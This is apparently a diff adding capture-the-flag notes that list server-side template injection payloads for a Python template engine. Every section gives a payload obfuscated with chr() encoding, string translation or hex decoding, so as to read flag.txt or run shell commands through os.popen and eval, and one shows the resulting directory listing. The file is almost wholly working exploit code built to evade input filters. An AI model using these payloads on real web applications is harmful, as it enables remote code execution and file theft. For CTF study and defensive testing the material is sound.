@@ -1,0 +1,33 @@
+========================================================================
+
+# open("flag.txt").read()
+
+${open(chr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(46)%2bchr(116)%2bchr(120)%2bchr(116)).read()}
+
+
+========================================================================
+# os.popen('ls').read()
+
+<% import os; x=chr(50).join([chr(111),chr(115),chr(46),chr(112),chr(111),chr(112),chr(101),chr(110),chr(40),chr(39),chr(108),chr(115),chr(39),chr(41),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41)]); x = x.translate({50 : None}); x = eval(x) %> ${x}
+
+```
+ app.py flag.txt static
+ ```
+
+# os.popen('cat flag.txt').read()
+Payload Translation
+```
+import os;
+x = "o2s2.2p2o2p2e2n2(2'2c2a2t2 2f2l2a2g2.2t2x2t2'2)2.2r2e2a2d2(2)";
+x = x.translate({50 : None});
+x = eval(x)
+```
+
+<% import os; x=chr(50).join([chr(111),chr(115),chr(46),chr(112),chr(111),chr(112),chr(101),chr(110),chr(40),chr(39),chr(99),chr(97),chr(116),chr(32),chr(102),chr(108),chr(97),chr(103),chr(46),chr(116),chr(120),chr(116),chr(39),chr(41),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41)]); x = x.translate({50 : None}); x = eval(x) %> ${x}
+
+========================================================================
+
+
+# open("flag.txt").read()
+
+${open(bytes.fromhex(hex(0x666c61672e747874)[2:])).read()}
